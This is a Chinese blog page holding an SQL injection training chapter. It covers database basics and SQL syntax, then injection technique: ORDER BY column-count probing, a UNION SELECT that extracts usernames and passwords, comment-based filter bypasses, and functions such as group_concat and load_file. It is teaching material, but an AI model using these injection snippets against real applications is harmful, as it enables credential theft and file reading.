<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 8.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/sign.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/small.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hnu-legend1440.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="拂云观 · legend1440">
<meta property="og:url" content="http://hnu-legend1440.com/page/2/index.html">
<meta property="og:site_name" content="拂云观 · legend1440">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="legend1440">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hnu-legend1440.com/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>拂云观 · legend1440</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">拂云观 · legend1440</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/categories/schedule/" rel="section"><i class="fa fa-skating fa-fw"></i>期末突击</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-chess fa-fw"></i>往世乐土</a>

  </li>
        <li class="menu-item menu-item-training">

    <a href="/categories/training/" rel="section"><i class="fa fa-yin-yang fa-fw"></i>集训修行</a>

  </li>
        <li class="menu-item menu-item-wp">

    <a href="/categories/WP/" rel="section"><i class="fa fa-feather fa-fw"></i>全面战场</a>

  </li>
        <li class="menu-item menu-item-puzzles">

    <a href="/categories/puzzles/" rel="section"><i class="fa fa-spa fa-fw"></i>练习札记</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="legend1440">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="拂云观 · legend1440">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/11/%E7%AC%AC%E5%9B%9B%E7%AB%A0-SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">第四章-SQL注入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-11-11 12:00:00" itemprop="dateCreated datePublished" datetime="2025-11-11T12:00:00+08:00">2025-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2026-01-21 01:41:26" itemprop="dateModified" datetime="2026-01-21T01:41:26+08:00">2026-01-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/K0giwmjwUiZksMkV7YbcD7qbnFb?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/K0giwmjwUiZksMkV7YbcD7qbnFb?from=from_copylink</a></p>
<h1 id="Week4-1-数据库基础与-SQL-基本语法"><a href="#Week4-1-数据库基础与-SQL-基本语法" class="headerlink" title="[Week4.1]数据库基础与 SQL 基本语法"></a>[Week4.1]数据库基础与 SQL 基本语法</h1><h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><p>参考文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/senxu_/article/details/126877128">https://blog.csdn.net/senxu_&#x2F;article&#x2F;details&#x2F;126877128</a></p>
<p><strong>数据库管理系统</strong>(Database Management System)是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称 DBMS。</p>
<p>它对数据库进行统一的管理和控制，以保证数据库的安全性和完整性。用户通过 DBMS 访问数据库中的数据，数据库管理员也通过 DBMS 进行数据库的维护工作。</p>
<p>它可以支持多个应用程序和用户用不同的方法在同时或不同时刻去建立，修改和询问数据库。大部分 DBMS 提供<strong>数据定义语言 DDL</strong> 和<strong>数据操作语言 DML</strong>，供用户定义数据库的模式结构与权限约束，实现对数据的追加、删除等操作。</p>
<p>其又是由<strong>许多程序所组成</strong>的一个大型软件系统，每个程序都有自己的功能，共同完成 DBMS 的一个或几个工作。</p>
<h3 id="DBMS-的组成程序"><a href="#DBMS-的组成程序" class="headerlink" title="DBMS 的组成程序"></a>DBMS 的组成程序</h3><p><strong>（1）语言编译处理程序</strong></p>
<p>包含数据定义语言 DDL 编译程序和数据操作语言 DML 编译程序.</p>
<p><strong>数据定义语言 DDL 编译程序</strong>把用 DDL 编写的各级源模式编译成各级目标模式。这些目标模式是对数据库结构信息的描述，它们被保存在数据字典中，供以后数据操纵或数据控制时使用。</p>
<p><strong>数据操作语言 DML 编译程序</strong>将应用程序中的 DML 语句转换成可执行程序，实现对数据库的检索、插入、删除和修改等基本操作。</p>
<p><strong>（2）系统运行控制程序</strong></p>
<p><strong>（3）系统建立、维护程序</strong></p>
<p><strong>（4）数据字典</strong></p>
<h3 id="DBMS-的功能"><a href="#DBMS-的功能" class="headerlink" title="DBMS 的功能"></a>DBMS 的功能</h3><p><strong>（1）数据定义功能</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBMS提供数据定义语言（Data Define Language，DDL），定义数据的模式、外模式和内模式三级模式结构，定义模式/内模式和外模式/模式二级映像，定义有关的约束条件。例如，为保证数据库安全而定义用户口令和存取权限，为保证正确语义而定义完整性规则等。再如,DBMS提供的结构化查询语言（SQL）提供Create、Drop、Alter等语句可分别用来建立、删除和修改数据库。</span><br><span class="line"></span><br><span class="line">用DDL定义的各种模式需要通过相应的模式翻译程序转换为机器内部代码表示形式，保存在数据字典（Data Dictionary，DD）（或称为系统目录）中。数据字典是DBMS存取数据的基本依据。因此，DBMS中应包括DDL的编译程序。</span><br></pre></td></tr></table></figure>

<p><strong>（2）数据操纵功能</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DBMS提供数据操纵语言（Data Manipulation Language，DML）实现对数据库的基本操作，包括检索、更新（包括插入、修改和删除）等。因此，在DBMS中也应包括DML的编译程序或解释程序。</span><br><span class="line"></span><br><span class="line">DML有两类：一类是自主型的或自含型的，这一类属于交互式命令语言，语法简单可独立使用；另一类是宿主型的，&lt;u&gt;它把对数据库的存取语句嵌入在高级语言&lt;/u&gt;（如Fortran、Pascal、C等）中，不能单独使用。**SQL就是数据操纵语言的一种。**例如,DBMS提供的结构化查询语言SQL提供查询语句（Select）、插入语句（Insert）、修改语句（Update）和删除语句（Delete），可分别实现对数据库中数据记录的查询、插入、修改和删除等操作。</span><br></pre></td></tr></table></figure>

<p><strong>（3）数据库运行管理功能</strong></p>
<p><strong>（4）数据库的建立和维护功能</strong></p>
<p><strong>（5）数据组织、存储、管理</strong></p>
<p><strong>（6）数据通信功能</strong></p>
<h3 id="DBMS-的特点"><a href="#DBMS-的特点" class="headerlink" title="DBMS 的特点"></a>DBMS 的特点</h3><p><strong>（1）数据结构化且统一管理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有DBMS统一管理。优点是数据易维护，易扩展，数据冗余明显减少，真正实现了数据的共享。</span><br></pre></td></tr></table></figure>

<p><strong>（2）有较高的数据独立性</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据库的独立性包括数据的物理独立性和数据的逻辑独立性。</span><br></pre></td></tr></table></figure>

<p><strong>（3）数据库控制功能</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括对数据库中数据的安全性、完整性、并发和恢复的控制。</span><br></pre></td></tr></table></figure>

<h2 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h2><p>一个数据库表（Table）是关系型数据库（如 MySQL、Oracle、SQL Server 等）中存储数据的<strong>核心结构化对象</strong>，本质是由「行（记录）」和「列（字段）」组成的二维表格，同时包含约束、元数据等辅助信息以保证数据的完整性和规范性。</p>
<p>假设你要做一个「班级学生登记表」，这个表就是数据库里的 “表”：</p>
<h3 id="列（字段）-表格的-“表头”"><a href="#列（字段）-表格的-“表头”" class="headerlink" title="列（字段）&#x3D; 表格的 “表头”"></a>列（字段）&#x3D; 表格的 “表头”</h3><p>就像 Excel 里第一行的 “姓名、学号、性别、生日、成绩”，数据库表的 “列” 就是给数据定规矩的：</p>
<ul>
<li>每一列有个明确的 “名字”（比如 “学号”“成绩”），不能重复；</li>
<li>每一列有固定 “格式”（比如 “学号” 只能是数字、“生日” 只能是日期、“成绩” 是 0-100 的数字）；</li>
<li>还能加 “小规则”（比如 “学号不能重复”“姓名必须填”“成绩不能是负数”）。</li>
</ul>
<h3 id="行（记录）-表格里的-“每一行数据”"><a href="#行（记录）-表格里的-“每一行数据”" class="headerlink" title="行（记录）&#x3D; 表格里的 “每一行数据”"></a>行（记录）&#x3D; 表格里的 “每一行数据”</h3><p>Excel 里除了表头，每一行都对应一个学生的信息，数据库表的 “行” 就是具体的 “实体数据”：</p>
<ul>
<li>一行对应一个完整的对象（比如 “张三” 这个人的所有信息）；</li>
<li>每一行的 “学号” 是唯一的（就像身份证），不会有两个学生学号一样；</li>
<li>行越多，说明存的实体越多（比如班里 50 个学生，就有 50 行）。</li>
</ul>
<h3 id="约束-给表格定的-“规矩”"><a href="#约束-给表格定的-“规矩”" class="headerlink" title="约束 &#x3D; 给表格定的 “规矩”"></a>约束 &#x3D; 给表格定的 “规矩”</h3><p>比如你在登记表里要求 “学号不能重复”“必须填姓名”“成绩不能超 100”，这些就是数据库表的 “约束”：</p>
<ul>
<li>保证数据不乱（不会出现 “学号重复”“没填姓名”“成绩 150 分” 这种离谱情况）；</li>
<li>就像生活中 “身份证号唯一”“上班必须打卡” 的规矩，防止出错。</li>
</ul>
<h3 id="索引-表格的-“目录”"><a href="#索引-表格的-“目录”" class="headerlink" title="索引 &#x3D; 表格的 “目录”"></a>索引 &#x3D; 表格的 “目录”</h3><p>如果班里有 1000 个学生，想快速找到 “学号 2024001 的学生”，总不能一行行翻吧？数据库的 “索引” 就像书的目录，提前记下 “学号 2024001 在第 3 行”，不用全表找，直接定位，查得更快。</p>
<h3 id="元数据-表格的-“备注”"><a href="#元数据-表格的-“备注”" class="headerlink" title="元数据 &#x3D; 表格的 “备注”"></a>元数据 &#x3D; 表格的 “备注”</h3><p>就像你在 Excel 表名旁边写 “2024 级 3 班学生表”，或者在表头备注 “成绩满分 100”，数据库的 “元数据” 就是记录这个表的基本信息：</p>
<ul>
<li>表叫什么名字、用来存什么（比如 “学生表” 存学生信息）；</li>
<li>每一列的格式、规矩是什么（比如 “生日是日期格式”）；</li>
<li>这个表是哪天建的、用了什么格式存储（比如 UTF-8 能存中文）。</li>
</ul>
<h3 id="数据的一般要求"><a href="#数据的一般要求" class="headerlink" title="数据的一般要求"></a>数据的一般要求</h3><p><strong>关键信息不能重（实体完整性：UNIQUE&#x2F;PRIMARY KEY）</strong></p>
<p>就像身份证号、学号不能和别人重复 —— 表中 “唯一标识” 类的列，值必须独一无二，用来区分不同行（不同对象）。</p>
<ul>
<li>要求：用 <code>PRIMARY KEY</code>（主键，非空 + 唯一，比如学号、用户 ID）或 <code>UNIQUE</code>（唯一约束，比如手机号、邮箱）；</li>
<li>例子：学生表的 “学号” 不能重复（一个学号对应一个学生）；订单表的 “订单号” 不能重复（一个订单号对应一个订单）；</li>
<li>反面教材：两个学生学号都是 “2024001”，查 “学号 2024001 的成绩” 会出来两行，根本分不清是谁的。</li>
</ul>
<p><strong>数据格式不能错（域完整性：数据类型 + CHECK）</strong></p>
<p>就像 “年龄” 只能填数字、“生日” 只能填日期 —— 每列的数据必须符合预设的 “格式规矩”，不能乱填。</p>
<ul>
<li>要求：列指定明确数据类型（INT &#x2F; 日期 &#x2F; VARCHAR 等），必要时加 <code>CHECK</code> 约束；</li>
<li>例子：“年龄” 列是 INT 类型，不能填 “二十”“99.5”“abc”；“成绩” 列加 <code>CHECK (成绩 BETWEEN 0 AND 100)</code>，不能填 150 分；“手机号” 是 CHAR (11)，不能填 10 位或 12 位；</li>
<li>反面教材：“生日” 列填 “2024-30-50”（日期不存在）、“成绩” 列填 “优秀”（不是数字），数据库没法识别，后续统计、查询全失效。</li>
</ul>
<h3 id="数据的选定"><a href="#数据的选定" class="headerlink" title="数据的选定"></a>数据的选定</h3><p><strong>列是 “直接指定”，行是 “靠列的条件间接筛选”</strong></p>
<p>在下面的函数中,用 column1,2,3 选定列，而行通常用 WHERE 条件选定</p>
<p>例如:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 学生表</span><br><span class="line"><span class="keyword">SET</span> 成绩 <span class="operator">=</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">WHERE</span> 年级 <span class="operator">=</span> <span class="number">2024</span> <span class="keyword">AND</span> 成绩 <span class="operator">&lt;</span> <span class="number">80</span>;  <span class="comment">-- 多条件组合选行</span></span><br></pre></td></tr></table></figure>

<h2 id="SQL-基本语法"><a href="#SQL-基本语法" class="headerlink" title="SQL 基本语法"></a>SQL 基本语法</h2><h3 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h3><p>SQL（Structured Query Language）是一种用于<strong>管理和操作关系数据库</strong>的标准语言，包括数据查询、数据插入、数据更新、数据删除、数据库结构创建和修改等功能。<strong>需要在数据库上执行的大部分工作都由 SQL 语句完成。</strong></p>
<p><img src="/images/X32VbWpTdopoqBxh8WEcv2k9nmf.png"></p>
<p>注意:SQL 对大小写不敏感：SELECT 与 select 是相同的。</p>
<p>某些数据库系统要求在每条 SQL 语句的末端使用<strong>分号</strong>。</p>
<p><strong>分号</strong>是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的 SQL 语句。</p>
<h3 id="数据的处理-查询-修改-插入-和删除"><a href="#数据的处理-查询-修改-插入-和删除" class="headerlink" title="数据的处理(查询 修改(插入)和删除)"></a>数据的处理(查询 修改(插入)和删除)</h3><h4 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h4><p>SELECT：用于从数据库中查询数据。</p>
<p>SELECT column_name(s)</p>
<p>FROM table_name</p>
<p>WHERE condition</p>
<p>ORDER BY column_name [ASC|DESC]</p>
<ul>
<li><code>column_name(s)</code>: 要查询的列。</li>
<li><code>table_name</code>: 要查询的表。</li>
<li><code>condition</code>: 查询条件（可选）。</li>
<li><code>ORDER BY</code>: 排序方式，<code>ASC</code> 表示升序，<code>DESC</code> 表示降序（可选）。</li>
</ul>
<p><strong>注意 没有分号,这四行是一条完整的 SELECT 语句,换行只为了可读性</strong></p>
<h4 id="INSERT-INTO"><a href="#INSERT-INTO" class="headerlink" title="INSERT INTO"></a>INSERT INTO</h4><p>INSERT INTO：用于向数据库表中插入新数据。</p>
<p>INSERT INTO table_name (column1, column2, …)</p>
<p>VALUES (value1, value2, …)</p>
<ul>
<li><code>table_name</code>: 要插入数据的表。</li>
<li><code>column1, column2, ...</code>: 要插入数据的列。</li>
<li><code>value1, value2, ...</code>: 对应列的值。</li>
</ul>
<h4 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h4><p>UPDATE：用于更新数据库表中的现有数据。</p>
<p>UPDATE table_name</p>
<p>SET column1 &#x3D; value1, column2 &#x3D; value2, …</p>
<p>WHERE condition</p>
<ul>
<li><code>table_name</code>: 要更新数据的表。</li>
<li><code>column1 = value1, column2 = value2, ...</code>: 要更新的列及其新值。</li>
<li><code>condition</code>: 更新条件。</li>
</ul>
<h4 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h4><p>DELETE：用于从数据库表中删除数据。</p>
<p>DELETE FROM table_name</p>
<p>WHERE condition</p>
<ul>
<li><code>table_name</code>: 要删除数据的表。</li>
<li><code>condition</code>: 删除条件。</li>
</ul>
<h3 id="数据库表的处理-创建-修改和删除"><a href="#数据库表的处理-创建-修改和删除" class="headerlink" title="数据库表的处理(创建 修改和删除)"></a>数据库表的处理(创建 修改和删除)</h3><h4 id="CREATE-TABLE"><a href="#CREATE-TABLE" class="headerlink" title="CREATE TABLE"></a>CREATE TABLE</h4><p>CREATE TABLE：用于创建新的数据库表。</p>
<p>CREATE TABLE table_name (</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">column1 data_type constraint,</span><br><span class="line"></span><br><span class="line">column2 data_type constraint,</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>)</p>
<ul>
<li><code>table_name</code>: 要创建的表名。</li>
<li><code>column1, column2, ...</code>: 表的列。</li>
<li><code>data_type</code>: 列的数据类型（如 <code>INT</code>、<code>VARCHAR</code> 等）。</li>
<li><code>constraint</code>: 列的约束（如 <code>PRIMARY KEY</code>、<code>NOT NULL</code> 等）。</li>
</ul>
<h4 id="ALTER-TABLE"><a href="#ALTER-TABLE" class="headerlink" title="ALTER TABLE"></a>ALTER TABLE</h4><p>ALTER TABLE：用于修改(添加或者删除列)现有数据库表的结构。</p>
<p>ALTER TABLE table_name</p>
<p>ADD column_name data_type</p>
<ul>
<li><code>table_name</code>: 要修改的表。</li>
<li><code>column_name</code>: 要添加的列。</li>
<li><code>data_type</code>: 列的数据类型。</li>
</ul>
<p>或：</p>
<p>ALTER TABLE table_name</p>
<p>DROP COLUMN column_name</p>
<ul>
<li><code>column_name</code>: 要删除的列。</li>
</ul>
<h4 id="DROP-TABLE"><a href="#DROP-TABLE" class="headerlink" title="DROP TABLE"></a>DROP TABLE</h4><p>DROP TABLE：用于删除数据库表。</p>
<p>DROP TABLE table_name</p>
<ul>
<li><code>table_name</code>: 要删除的表。</li>
</ul>
<h3 id="索引的操作"><a href="#索引的操作" class="headerlink" title="索引的操作"></a>索引的操作</h3><h4 id="CREATE-INDEX"><a href="#CREATE-INDEX" class="headerlink" title="CREATE INDEX"></a>CREATE INDEX</h4><p>CREATE INDEX：用于创建索引，以加快查询速度。</p>
<p>CREATE INDEX index_name</p>
<p>ON table_name (column_name)</p>
<ul>
<li><code>index_name</code>: 索引的名称。</li>
<li><code>column_name</code>: 要索引的列。</li>
</ul>
<h4 id="DROP-INDEX"><a href="#DROP-INDEX" class="headerlink" title="DROP INDEX"></a>DROP INDEX</h4><p>DROP INDEX：用于删除索引。</p>
<p>DROP INDEX index_name</p>
<p>ON table_name</p>
<ul>
<li><code>index_name</code>: 要删除的索引名称。</li>
<li><code>table_name</code>: 索引所在的表。</li>
</ul>
<h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><h4 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h4><p>WHERE：用于指定筛选条件。</p>
<p>SELECT column_name(s)</p>
<p>FROM table_name</p>
<p>WHERE condition</p>
<ul>
<li><code>condition</code>: 筛选条件。</li>
</ul>
<p>例如 列名 &#x3D; … 等</p>
<h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>ORDER BY：用于对结果集进行排序。</p>
<p>SELECT column_name(s)</p>
<p>FROM table_name</p>
<p>ORDER BY column_name [ASC|DESC]</p>
<ul>
<li><code>column_name</code>: 用于排序的列。</li>
<li><code>ASC</code>: 升序（默认）。</li>
<li><code>DESC</code>: 降序。</li>
</ul>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br></pre></td></tr></table></figure>

<p>其中，column1、column2 等表示要查询的列名，table_name 表示要查询的表名，condition  表示查询条件，column_name 表示要按照哪一列进行排序，ASC 或 DESC  表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</p>
<p>注意:<strong>在 SQL 注入中我们常用它来判断列数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>

<h4 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h4><p>GROUP BY：用于将结果集按一列或多列进行分组。</p>
<p>SELECT column_name(s), aggregate_function(column_name)</p>
<p>FROM table_name</p>
<p>WHERE condition</p>
<p>GROUP BY column_name(s)</p>
<ul>
<li><code>aggregate_function</code>: 聚合函数（如 COUNT、SUM、AVG 等）。</li>
</ul>
<h4 id="HAVING"><a href="#HAVING" class="headerlink" title="HAVING"></a>HAVING</h4><p>HAVING：用于对分组后的结果集进行筛选。</p>
<p>SELECT column_name(s), aggregate_function(column_name)</p>
<p>FROM table_name</p>
<p>GROUP BY column_name(s)</p>
<p>HAVING condition</p>
<ul>
<li><code>condition</code>: 筛选条件。</li>
</ul>
<h4 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h4><p>JOIN：用于将两个或多个表的记录结合起来。</p>
<p>SELECT column_name(s)</p>
<p>FROM table_name1</p>
<p>JOIN table_name2</p>
<p>ON table_name1.column_name &#x3D; table_name2.column_name</p>
<ul>
<li><code>JOIN</code>: 可以是 INNER JOIN、LEFT JOIN、RIGHT JOIN 或 FULL JOIN。</li>
</ul>
<h4 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h4><p>DISTINCT：用于返回唯一不同的值。</p>
<p>SELECT DISTINCT column_name(s)</p>
<p>FROM table_name</p>
<ul>
<li><code>column_name(s)</code>: 要查询的列。</li>
</ul>
<h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="*LIMIT"></a>*LIMIT</h4><p><code>LIMIT</code> 限制返回的记录数量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#返回表中前number行数据</span><br><span class="line">SELECT column1, column2, ... FROM table_name LIMIT number;</span><br><span class="line">#从offset+1行开始返回row_count行数据</span><br><span class="line">SELECT column1, column2, ... FROM table_name LIMIT offset, row_count;</span><br><span class="line">#比如 LIMIT 10, 10 返回11-20行数据</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</span><br></pre></td></tr></table></figure>

<h4 id="UNION"><a href="#UNION" class="headerlink" title="*UNION"></a>*UNION</h4><ul>
<li><code>UNION</code> 用于合并两个或多个 SELECT 语句的结果集</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 列名 FROM 表名UNIONSELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>

<p>注意：使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="*注释"></a>*注释</h3><ul>
<li><code>注释</code></li>
</ul>
<p><code>--</code> 这是一个单行注释。注意，<code>--</code> 后必须加一个空格或者加号，注释才会生效，所以一般用–+ + 表示空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br></pre></td></tr></table></figure>

<p><code>#</code> 是另一种单行注释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br></pre></td></tr></table></figure>

<p>多行注释使用 <code>/*</code> 和 <code>*/</code> 包裹注释内容，可以跨多行书写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格/*中间的内容都将被注释*/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在，在其他数据库中会被忽略</span><br></pre></td></tr></table></figure>

<h3 id="常用参数"><a href="#常用参数" class="headerlink" title="*常用参数"></a>*常用参数</h3><p>常用参数：</p>
<ul>
<li><code>user()</code>：当前数据库用户</li>
<li><code>database()</code>：当前数据库名</li>
<li><code>version()</code>：当前使用的数据库版本</li>
<li><code>@@datadir</code>：数据库存储数据路径</li>
<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
<li><code>concat_ws()</code>：用法类似</li>
<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
<li><code>CHAR()</code>：把整数转换为对应的字符</li>
<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
